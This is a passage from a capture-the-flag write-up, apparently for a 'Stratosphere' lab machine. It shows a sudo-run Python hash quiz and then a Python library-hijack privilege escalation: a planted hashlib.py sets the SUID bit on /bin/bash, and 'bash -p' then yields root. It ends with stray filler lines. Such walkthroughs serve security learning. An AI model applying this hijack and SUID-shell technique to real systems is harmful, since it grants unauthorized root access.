</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Nope, that one didn&#39;t work...&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;WOW, you&#39;re really good at this!&#34;</span>)
</span></span><span style="display:flex;"><span>    q3 <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;How about this? 91ae5fc9ecbca9d346225063f23d2bd9</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    md4 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#39;md4&#39;</span>)
</span></span><span style="display:flex;"><span>    md4<span style="color:#f92672">.</span>update(q3<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> md4<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;91ae5fc9ecbca9d346225063f23d2bd9&#39;</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Yeah, I don&#39;t think that&#39;s right.&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;OK, OK! I get it. You know how to crack hashes...&#34;</span>)
</span></span><span style="display:flex;"><span>    q4 <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    blake <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#39;BLAKE2b512&#39;</span>)
</span></span><span style="display:flex;"><span>    blake<span style="color:#f92672">.</span>update(q4<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> blake<span style="color:#f92672">.</span>hexdigest() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943&#39;</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;You were so close! urg... sorry rules are rules.&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;/root/success.py&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>question()
</span></span></code></pre></div><hr>
<h2 id="library-hail-jacking">Library hail jacking</h2>
<p>The <em><strong>hashlib</strong></em> library is imported.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>richard@stratosphere:~$ python -c <span style="color:#e6db74">&#39;import sys; print(sys.path)&#39;</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;/usr/lib/python35.zip&#39;</span>, <span style="color:#e6db74">&#39;/usr/lib/python3.5&#39;</span>, <span style="color:#e6db74">&#39;/usr/lib/python3.5/plat-x86_64-linux-gnu&#39;</span>, <span style="color:#e6db74">&#39;/usr/lib/python3.5/lib-dynload&#39;</span>, <span style="color:#e6db74">&#39;/usr/local/lib/python3.5/dist-packages&#39;</span>, <span style="color:#e6db74">&#39;/usr/lib/python3/dist-packages&#39;</span><span style="color:#f92672">]</span>
</span></span></code></pre></div><p>This is the order of priority of the paths to which the libraries will be looked for
<em><strong>usr/lib/python3.5</strong></em>
<em><strong>&rsquo;&rsquo;</strong></em> , this is looking in the current working directory</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>richard@stratosphere:~$ find / -name hashlib.py 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/lib/python3.5/hashlib.py
</span></span><span style="display:flex;"><span>/usr/lib/python2.7/hashlib.py
</span></span></code></pre></div><p>We create our own library <em><strong>hashlib.py</strong></em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/home/richard
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>touch hashlib.py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod u+s /bin/bash&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>richard@stratosphere:~$ sudo -u root /usr/bin/python /home/richard/test.py 
</span></span><span style="display:flex;"><span>Solve: 5af003e100c80923ec04d65933d382cb
</span></span><span style="display:flex;"><span>^CTraceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/richard/test.py&#34;</span>, line 38, in &lt;module&gt;
</span></span><span style="display:flex;"><span>    question<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>  File <span style="color:#e6db74">&#34;/home/richard/test.py&#34;</span>, line 6, in question
</span></span><span style="display:flex;"><span>    q1 <span style="color:#f92672">=</span> input<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Solve: 5af003e100c80923ec04d65933d382cb\n&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>KeyboardInterrupt
</span></span></code></pre></div><p>When viewing the <em><strong>/bin/bash</strong></em> it is already SUID</p>
<p>|</p>
<pre tabindex="0"><code>richard@stratosphere:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>richard@stratosphere:~$ bash -p 
</span></span><span style="display:flex;"><span>bash-4.4# whoami
</span></span><span style="display:flex;"><span>root
</span></span></code></pre></div><p>aa
a
a
a
a
a
a
a
a
a
a
a
a
a
a
a
a
a
a
a
a
a
a</p>

    </div>
    

    
      
    
      </div>
  </div>
  </div>

        </div>
    </body><footer class="footer">
  <div class="content-p" style="text-align: center">
      <div style="padding-bottom: 10px">Copyright <a href="">2023 Lio Nievas</a></div>
  </div>
</footer></html>
